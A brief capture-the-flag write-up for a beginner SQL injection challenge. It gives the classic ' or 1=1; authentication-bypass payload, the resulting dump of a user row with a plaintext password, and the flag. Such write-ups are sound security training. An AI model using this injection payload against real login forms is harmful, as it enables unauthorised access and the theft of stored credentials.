# Beginner - SQL (by Dax)

## 1 - The Most Basic Form of Injection.   

* **Track:** sql injection
* **Points:** 3

### Challenge

> SQL injection is probably one of the most common vectors of attack for poorly designed websites. This page is vulnerable to it. You can use username test and password test if you want to test the page before the injection.
> https://sqli.dax.hfctf.ca/  

### Solution

     ' or 1=1;

| userId | username | userpass | description |
| 1 | sp00ky | SwibAPCMuj34 | You found a flag! HF-nhnq0PRIVvjg3c6ZqJtBrbcXz98XCdJl |


### Flag

```
HF-nhnq0PRIVvjg3c6ZqJtBrbcXz98XCdJl
```
 